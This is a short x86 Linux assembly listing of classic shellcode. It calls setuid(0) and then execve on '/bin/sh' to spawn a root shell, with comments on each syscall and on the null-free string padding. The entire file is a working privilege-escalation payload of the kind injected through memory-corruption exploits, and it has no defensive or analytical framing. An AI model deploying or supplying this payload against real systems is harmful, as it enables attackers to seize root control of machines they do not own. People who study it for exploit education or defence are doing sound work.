.text

.global _start
_start:
    # setuid(0)
    xor    %eax, %eax
    xor    %ebx, %ebx
    mov    $23, %al
    int    $0x80        # all instructions after this point run as UID=0 (root)

    # execve("/bin/sh", NULL, NULL)
    xor    %eax, %eax
    push   %eax
    push   $0x68732f2f      # "//sh"  -> the // is needed for padding
    push   $0x6e69622f      # "/bin"
    mov    %esp, %ebx       
    xor    %ecx, %ecx       # argv = NULL
    xor    %edx, %edx       # envp = NULL
    mov    $11, %al
    int    $0x80

    # exit(0)
    xor    %ebx, %ebx
    mov    $1, %al
    int    $0x80

